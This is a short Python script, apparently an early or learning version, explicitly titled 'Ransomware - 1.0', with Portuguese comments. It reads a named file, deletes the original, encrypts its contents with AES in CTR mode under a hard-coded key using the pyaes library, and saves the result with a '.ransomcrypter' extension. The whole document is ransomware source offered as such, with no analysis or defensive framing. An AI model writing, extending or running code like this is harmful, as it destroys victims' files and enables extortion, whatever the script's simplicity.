"""
Ransomware - 1.0
By Carlos Henrique Barros Silva Campos
"""
import os
import pyaes

# Abre arquivo

file_name = 'Arquivos a ser cryptograados'
file = open(file_name, 'rb')
file_data = file.read()

file.close()

# Remove arquivo
os.remove(file_name)

# Crypter
key = b"1ab2c3e4f5g6h7i8"  # 16 byts key
aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(file_data)

# Salvando arquivo novo

new_file = file_name + ".ransomcrypter"
new_file = open(new_file, 'wb')
new_file.write(crypto_data)
new_file.close()
